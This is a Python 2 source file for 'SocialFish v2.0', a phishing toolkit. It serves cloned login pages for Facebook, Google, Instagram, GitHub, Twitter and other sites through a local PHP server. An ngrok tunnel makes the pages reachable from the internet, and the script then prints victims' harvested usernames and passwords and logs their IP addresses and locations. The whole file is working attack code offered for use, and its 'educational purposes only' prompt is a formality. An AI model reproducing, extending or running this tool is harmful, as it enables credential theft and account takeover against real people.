#!/usr/bin/python2.7
#-*- coding: utf-8 -*-
#   SOCIALFISH v2.0
#     by: An0nUD4Y
#
###########################
from time import sleep
from sys import stdout, exit
from os import system, path
import multiprocessing
from urllib import urlopen
from platform import system as systemos, architecture
from wget import download
RED, WHITE, CYAN, GREEN, END = '\033[91m', '\33[46m', '\033[36m', '\033[1;32m', '\033[0m'

def connected(host='http://duckduckgo.com'):
    try:
        urlopen(host)
        return True
    except:
        return False
if connected() == False:
     print '''
  ....._____.......     ____ ____ ____ _ ____ _       ____ _ ____ _  _ 
      /     \/|         [__  |  | |    | |__| |       |___ | [__  |__|
      \o__  /\|         ___] |__| |___ | |  | |___    |    | ___] |  |
          \|           
                    {0}[{1}!{0}]{1} Network error. Verify your connection.\n
'''.format(RED, END)
     exit(0)

def checkNgrok():
    if path.isfile('Server/ngrok') == False: 
        print '[*] Downloading Ngrok...'
        ostype = systemos().lower()
        if architecture()[0] == '64bit':
            filename = 'ngrok-stable-{0}-amd64.zip'.format(ostype)
        else:
            filename = 'ngrok-stable-{0}-386.zip'.format(ostype)
        url = 'https://bin.equinox.io/c/4VmDzA7iaHb/' + filename
        download(url)
        system('unzip ' + filename)
        system('mv ngrok Server/ngrok')
        system('rm -Rf ' + filename)
        system('clear')
checkNgrok()

def end():
    system('clear')
    print '''
                   S O C I A L{2} 
              |\    \ \ \ \ \ \ \      __           ___
              |  \    \ \ \ \ \ \ \   | O~-_    _-~~   ~~-_
              |   >----|-|-|-|-|-|-|--|  __/   /   {1}DON'T{2}   )
              |  /    / / / / / / /   |__\   <     {1}FORGET{2}   )
              |/     / / / / / / /             \_   {1}ME !{2}  _)
                          {1}F I S H{2}                ~--___--~
               {0}NOW WITH LIVE VICTIM ATTACK INFORMATION ]
{1}[ {0} Some more phising pages have been added in script. For a better Attack]
[ {0} Work Done By------------------------> An0nUD4Y]\n'''.format(RED, END, CYAN)

def loadModule(module):
       print '''{0}
   _.-=-._     .-, 
 .'       "-.,' / 
(          _.  < 
 `=.____.="  `._\\


 [{1}*{0}]{1} %s module loaded. Building site...{0}'''.format(CYAN, END) % module

def runPhishing(social, option2):
    system('sudo rm -Rf Server/www/*.* && touch Server/www/usernames.txt')
    if option2 == '1' and social == 'Facebook':
        system('cp WebPages/fb_standard/*.* Server/www/')
    if option2 == '2' and social == 'Facebook':
        system('cp WebPages/fb_advanced_poll/*.* Server/www/')  
    if option2 == '3' and social == 'Facebook':
        system('cp WebPages/mobile_fb/*.* Server/www/')   
    if option2 == '4' and social == 'Facebook':
        system('cp WebPages/fb_security_fake/*.* Server/www/')  
    if option2 == '5' and social == 'Facebook':
        system('cp WebPages/fb_messenger/*.* Server/www/')         
    elif option2 == '1' and social == 'Google':
        system('cp WebPages/google_standard/*.* Server/www/')
    elif option2 == '2' and social == 'Google':
        system('cp WebPages/google_advanced_poll/*.* Server/www/')
    elif option2 == '3' and social == 'Google':
        system('cp WebPages/google_advanced_web/*.* Server/www/')   
    elif social == 'LinkedIn':
        system('cp WebPages/linkedin/*.* Server/www/')
    elif social == 'GitHub':
        system('cp WebPages/GitHub/*.* Server/www/')
    elif social == 'StackOverflow':
        system('cp WebPages/stackoverflow/*.* Server/www/')
    elif social == 'WordPress':
        system('cp WebPages/wordpress/*.* Server/www/')
    elif social == 'Twitter':
        system('cp WebPages/twitter/*.* Server/www/')
    elif social == 'Snapchat':
        system('cp WebPages/Snapchat_web/*.* Server/www/')
    elif option2 == '1' and social == 'Instagram':
        system('cp WebPages/Instagram_web/*.* Server/www/')    
    elif option2 == '2' and social == 'Instagram':
        system('cp WebPages/Instagram_autoliker/*.* Server/www/')
        
def waitCreds():
    print " {0}[{1}*{0}]{1} Hi Hacker Everything has been completed.............. Start HAcking ".format(RED, END) 
  
    print '''{0}
   _.-=-._     .-, 
 .'       "-.,' / 
(  AnonUD4Y_  ~.< 
 `=.____.="  `._\\ 
 
 [{1}*{0}]{1} NOW YOU WILL GET YOUR VICTIM'S LIVE INFORMATION  
 [{1}*{0}]{1} JUST GOTO YOUR [ SocialFish/server/www/iplog.txt ]
 [{1}*{0}]{1} GET VICTIM'S IP ADDRESS, ISP, GEOLOCATION, AND MANY MORE STUFF.{0}'''.format(CYAN, END)
   
    print " {0}[{1}*{0}]{1} Waiting for credentials & victim's info... \n".format(RED, END)
    while True:
        with open('Server/www/usernames.txt') as creds:
            lines = creds.read().rstrip()
        if len(lines) != 0: 
            print ' {0}[ CREDENTIALS FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines
            system('rm -rf Server/www/usernames.txt && touch Server/www/usernames.txt')
            print ' {0}VICTIM INFORMATION AVAILABLE IN [ server/www/iplog.txt ]{1}\n {0}{1}'.format(RED, END)
            print ' {0}HOPE YOU ARE ENJOYING. SO PLEASE MAKE IT MORE AVILABLE TO ALL PEOPLE {1}\n {0}{1}'.format(RED, END)
        creds.close()

def runPEnv():
    system('clear')
    print '''           {2}-{1} An0nUD4Y {2}|{1} An0nUD4Y {2}|{1} An0nUD4Y {2}- INDIA
                          '
                        '   '
                      '       '
                 .  '  .        '                        '
             '             '      '                   '   '
  ███████ ████████ ███████ ██ ███████ ██       ███████ ██ ███████ ██   ██ 
  ██      ██    ██ ██      ██ ██   ██ ██       ██      ██ ██      ██   ██ 
  ███████ ██    ██ ██      ██ ███████ ██       █████   ██ ███████ ███████ 
       ██ ██    ██ ██      ██ ██   ██ ██       ██      ██      ██ ██   ██ 
  ███████ ████████ ███████ ██ ██   ██ ███████  ██      ██ ███████ ██   ██ 
      .    '   '....'               ..'.      ' .
         '  .                     .     '          '     '  {1}v2.0{2} 
               '  .  .  .  .  . '.    .'              '  .
                   '         '    '. '  {1}Updated_By--> AnonUD4Y_{2}    
                     '        {0}[ NOW WITH LIVE VICTIM ATTACK INFORMATION ]      
                       ' .  '
                           '
                             {1}'''.format(GREEN, END, CYAN)

    for i in range(101):
        sleep(0.01)
        stdout.write("\r{0}[{1}*{0}]{1} Preparing environment... %d%%".format(CYAN, END) % i)
        stdout.flush()
   
    print "\n\n{0}[{1}*{0}]{1} Searching for PHP installation... ".format(CYAN, END) 
    if 256 != system('which php'):
        print " --{0}>{1} OK.".format(CYAN, END)
    else:
	print " --{0}>{1} PHP NOT FOUND: \n {0}*{1} Please install PHP and run me again. http://www.php.net/".format(RED, END)
        exit(0)
    if raw_input(" {0}[{1}!{0}]{1} Do you agree to use this tool for educational purposes only? (y/n)\n {2}SF-An0nUD4Y > {1}".format(RED, END, CYAN)).upper() != 'Y':
        system('clear')
        print '\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU NEED A GOOD MIND AND SOUL TO BE ONE OF US. GET AWAY FROM HERE AND DO NOT COME BACK WITH SAME MOTIVE. GOOD BYE!{1} ]\n'.format(RED, END)
        exit(0)
    option = raw_input("\nSelect an option:\n\n {0}[{1}1{0}]{1} Facebook\n\n {0}[{1}2{0}]{1} Google\n\n {0}[{1}3{0}]{1} LinkedIn\n\n {0}[{1}4{0}]{1} GitHub\n\n {0}[{1}5{0}]{1} StackOverflow\n\n {0}[{1}6{0}]{1} WordPress\n\n {0}[{1}7{0}]{1} Twitter\n\n {0}[{1}8{0}]{1} Instagram\n\n {0}[{1}9{0}]{1} Snapchat\n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED With An0nUD4Y !\n\n {0}SF-An0nUD4Y >  {1}".format(CYAN, END))
    if option == '1':
        loadModule('Facebook')
        option2 = raw_input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n\n {0}[{1}3{0}]{1} Facebook Phishing- Mobile Version(mobile_mode)\n\n {0}[{1}4{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n\n {0}[{1}5{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED !\n\n {0}SF-An0nUD4Y > {1}".format(CYAN, END))
        runPhishing('Facebook', option2)
    elif option == '2':
        loadModule('Google')
        option2 = raw_input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n {0}[{1}3{0}]{1} New Google Web\n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED !\n\n {0}SF-An0nUD4Y > {1}".format(CYAN, END))
        runPhishing('Google', option2)
    elif option == '3':
        loadModule('LinkedIn')
        option2 = ''
        runPhishing('LinkedIn', option2)
    elif option == '4':
        loadModule('GitHub')
        option2 = ''
        runPhishing('GitHub', option2)
    elif option == '5':
        loadModule('StackOverflow')
        option2 = ''
        runPhishing('StackOverflow', option2)
    elif option == '6':
        loadModule('WordPress')
        option2 = ''
        runPhishing('WordPress', option2)
    elif option == '7':
        loadModule('Twitter')
        option2 = ''
        runPhishing('Twitter', option2)
    elif option == '8':
        loadModule('Instagram')
        option2 =raw_input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (After submit redirects to original autoliker)\n\n {0}[{1}------------->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED ! \n\n {0}SF-An0nUD4Y > {1}".format(CYAN, END))
        runPhishing('Instagram', option2)
    elif option == '9':
        loadModule('Snapchat')
        option2 = ''
        runPhishing('Snapchat', option2)    
    else:
        exit(0)

def runNgrok():
    system('./Server/ngrok http 80 > /dev/null &')
    sleep(10)
    system('curl -s -N http://127.0.0.1:4040/status | grep "https://[0-9a-z]*\.ngrok.io" -oh > ngrok.url')
    url = open('ngrok.url', 'r')
    print('\n {0}[{1}*{0}]{1} Ngrok URL: {2}' + url.read() + '{1}').format(CYAN, END, RED)
    url.close()

def runServer():
    system("cd Server/www/ && sudo php -S 127.0.0.1:80")

if __name__ == "__main__":
    try:
        runPEnv()
        runNgrok()
        multiprocessing.Process(target=runServer).start()
        waitCreds()
    except KeyboardInterrupt:
        system('pkill -f ngrok')
        end()
        exit(0)
